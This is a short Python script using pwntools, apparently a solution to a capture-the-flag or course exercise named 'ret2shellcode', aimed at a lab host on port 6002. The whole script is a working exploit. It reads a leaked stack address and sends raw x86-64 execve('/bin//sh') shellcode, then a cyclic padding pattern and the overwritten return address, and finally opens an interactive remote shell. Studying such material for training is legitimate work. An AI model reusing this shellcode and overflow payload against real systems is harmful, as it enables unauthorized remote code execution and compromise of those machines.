from pwn import *

local = False
elf = 'ret2shellcode' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "sqlab.zongyuan.nctu.me"
    port = 6002
    r = remote(ip,port)

context.arch = 'amd64'

r.recvuntil('address: ')
temp = r.recvline(keepends=False)
address = int(temp, 16)

shellcode = "\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\xB0\x3B\x0F\x05"
payload = shellcode + 'AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAA' + p64(address)

r.recvuntil('Input:')
r.sendline(payload)
r.interactive()


